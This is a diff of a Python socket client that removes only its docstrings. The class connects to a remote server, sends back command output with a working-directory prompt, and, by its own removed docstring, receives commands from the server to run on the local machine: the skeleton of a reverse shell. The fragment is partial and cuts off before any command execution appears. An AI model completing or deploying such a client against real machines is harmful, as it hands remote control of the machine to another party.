@@ -33,7 +33,6 @@ class Client(object):
         sys.exit(0)
 
     def socket_create(self):
-        """ Create a socket """
         try:
             self.socket = socket.socket()
         except socket.error as e:
@@ -42,7 +41,6 @@ class Client(object):
         return
 
     def socket_connect(self):
-        """ Connect to a remote socket """
         try:
             self.socket.connect((self.serverHost, self.serverPort))
         except socket.error as e:
@@ -57,14 +55,12 @@ class Client(object):
         return
 
     def print_output(self, output_str):
-        """ Prints command output """
         sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
         print(output_str)
         return
 
     def receive_commands(self):
-        """ Receive commands from remote server and run on local machine """
         try:
             self.socket.recv(10)
         except Exception as e:
